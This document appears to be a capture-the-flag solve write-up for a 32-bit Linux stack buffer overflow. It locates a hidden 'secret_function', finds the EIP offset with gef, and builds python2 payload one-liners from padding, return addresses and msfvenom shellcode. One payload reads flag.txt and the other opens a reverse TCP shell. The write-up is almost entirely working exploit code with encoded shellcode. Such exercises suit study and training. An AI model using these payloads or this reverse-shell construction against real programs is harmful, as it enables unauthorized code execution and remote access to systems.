### SOLVE

// Locate win-function, control EIP, find jump-point (jmp esp)
```as
0x08049192  secret_function		'\x92\x91\x04\x08'
0x080491a4  receive_feedback	'\xa4\x91\x04\x08'
0x080491dd  main				'\xdd\x91\x04\x08'

gef➤  pattern create
..snip..

gef➤  pattern offset $eip
[+] Searching for '74616161'/'61616174' with period=4
[+] Found at offset 76 (little-endian search) likely


```
// Create payload
```shell


``` 
// Create Payload
// msfvenom -p linux/x86/exec CMD='cat ./flag.txt' -f c -b '\x00'
```shell
python2 -c "print('A' * 76 + '\x92\x91\x04\x08' + '\x9f\x91\x04\x08' + '\xda\xc9\xb8\x43\xef\x24\x0e\xd9\x74\x24\xf4\x5b\x29\xc9\xb1\x0d\x31\x43\x19\x03\x43\x19\x83\xc3\x04\xa1\x1a\x4e\x05\x7d\x7c\xdd\x7f\x15\x53\x81\xf6\x02\xc3\x6a\x7a\xa4\x14\x1d\x53\x56\x7c\xb3\x22\x75\x2c\xa3\x3a\x79\xd1\x33\x26\x18\xa5\x13\x86\xf5\x23\x38\xb7\x6e\x82\xb4\x4f\x04\xda\x63\xe3\x6d\x3b\x46\x83')" > payload.bin
```
// Create payload (reverse shell)
// msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=31337 -f c -b '\x00'
```shell
// [padding + secret_function + jmp esp + shellcode]
python2 -c "print('A' * 76 + '\x92\x91\x04\x08' + '\xdb\xc3\xbb\x84\x67\xf9\xa1\xd9\x74\x24\xf4\x5a\x33\xc9\xb1\x12\x31\x5a\x17\x83\xc2\x04\x03\xde\x74\x1b\x54\xef\xa1\x2c\x74\x5c\x15\x80\x11\x60\x10\xc7\x56\x02\xef\x88\x04\x93\x5f\xb7\xe7\xa3\xe9\xb1\x0e\xcb\x96\x41\xf1\x0a\x01\x40\xf1\x1d\x8d\xcd\x10\xad\x4b\x9e\x83\x9e\x20\x1d\xad\xc1\x8a\xa2\xff\x69\x7b\x8c\x8c\x01\xeb\xfd\x5d\xb3\x82\x88\x41\x61\x06\x02\x64\x35\xa3\xd9\xe7')" > payload.shell
```